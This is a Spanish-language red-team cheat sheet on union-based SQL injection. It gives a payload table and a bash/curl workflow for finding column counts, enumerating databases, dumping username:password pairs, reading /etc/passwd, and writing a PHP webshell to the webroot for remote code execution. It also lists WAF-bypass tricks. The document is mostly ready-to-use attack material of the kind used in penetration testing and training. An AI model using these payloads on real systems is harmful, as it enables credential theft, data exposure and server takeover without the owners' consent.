---
aliases:
  - Union-based SQLi
tags:
  - vuln/sqli
  - technique/execution
  - asset/database
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[SQL Injection (SQLi)]]"
---
# SQLi - Union based

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `' ORDER BY 1-- -` (incrementar hasta error) | Cantidad exacta de columnas — último valor sin error | Primer paso obligatorio. |
| `' UNION SELECT NULL,NULL,NULL-- -` | Confirma cantidad de columnas con NULLs (compatible con cualquier tipo) | Validación post-`ORDER BY`. |
| `' UNION SELECT 'a',NULL,NULL-- -` (iterar columna) | Columna que refleja strings en frontend | Identificar dónde mostrar data. |
| `' UNION SELECT @@version,user(),database()-- -` | Versión SGBD + user actual + DB activa | Recon inicial. |
| `' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -` | Lista todas las bases de datos | Enum de DBs disponibles. |
| `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dev'-- -` | Tablas de la DB `dev` | Enum de tablas. |
| `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -` | Columnas de tabla `users` | Enum de columnas. |
| `' UNION SELECT group_concat(username,0x3a,password),NULL FROM users-- -` | Dump completo user:pass en una sola fila | Cuando frontend solo refleja 1 fila. |
| `' UNION SELECT super_priv,NULL FROM mysql.user WHERE user='root'-- -` | Si root es Super Admin | Pre-RCE check. |
| `' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -` | Lista de privilegios root | Privilege enum. |
| `' UNION SELECT variable_value,NULL FROM information_schema.global_variables WHERE variable_name='secure_file_priv'-- -` | Path donde se permite read/write file | Pre-RCE — confirmar File I/O. |
| `' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -` | Read arbitrario de archivos | `secure_file_priv=''` o path permitido + FILE privilege. |
| `' UNION SELECT 'file written',NULL INTO OUTFILE '/var/www/html/proof.txt'-- -` | Write de archivo en filesystem | Mismo requisito. |
| `' UNION SELECT '<?=`$_GET[0]`?>',NULL INTO OUTFILE '/var/www/html/shell.php'-- -` | Webshell PHP escrita al webroot → RCE | Filesystem writable + webroot accesible. |
^sqli-union

### Workflow estándar

```bash
TARGET="https://target/items?id=1"

# 1. Detectar nro columnas
for i in 1 2 3 4 5 6 7 8 9 10; do
  R=$(curl -s "$TARGET' ORDER BY $i-- -" -o /dev/null -w '%{http_code}')
  echo "ORDER BY $i → HTTP $R"
done
# Cuando $R=500 (o cambia content), $i-1 es el total

# 2. Validar UNION con NULLs (asumiendo 4 cols)
curl -s "$TARGET' UNION SELECT NULL,NULL,NULL,NULL-- -"

# 3. Identificar columnas reflejadas
for col in 1 2 3 4; do
  PAYLOAD="' UNION SELECT $([ $col -eq 1 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 2 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 3 ] && echo "'MARKER'" || echo NULL),$([ $col -eq 4 ] && echo "'MARKER'" || echo NULL)-- -"
  curl -s "$TARGET$(python3 -c "import urllib.parse;print(urllib.parse.quote(\"$PAYLOAD\"))")" | grep -c MARKER
done

# 4. Recon de SGBD
curl -s "$TARGET' UNION SELECT NULL,@@version,NULL,NULL-- -"

# 5. Dump combinado (cuando solo 1 fila se refleja)
curl -s "$TARGET' UNION SELECT NULL,group_concat(username,0x3a,password),NULL,NULL FROM users-- -"

# 6. Si privs File I/O OK → escalar a RCE
curl -s "$TARGET' UNION SELECT NULL,'<?=\`\$_GET[0]\`?>',NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -"
curl "https://target/shell.php?0=id"
```

---

## Overview

**Union-based SQLi** = aprovecho `UNION SELECT` para anexar resultados arbitrarios a la consulta original. Mejor método de exfiltración cuando aplica — directo, sin inferencias.

**Pre-requisitos:**
1. Conocer cantidad exacta de columnas (`ORDER BY`).
2. Conocer tipos compatibles (usar `NULL` evita issues).
3. Saber cuál columna se refleja al frontend.

Si la app filtra `UNION` → probar `/*!UNION*/`, `UNIunionON`, case mixing, encoding. Si frontend NO refleja ninguna columna → pivotar a [[SQLi - Error based]] o blind.

---
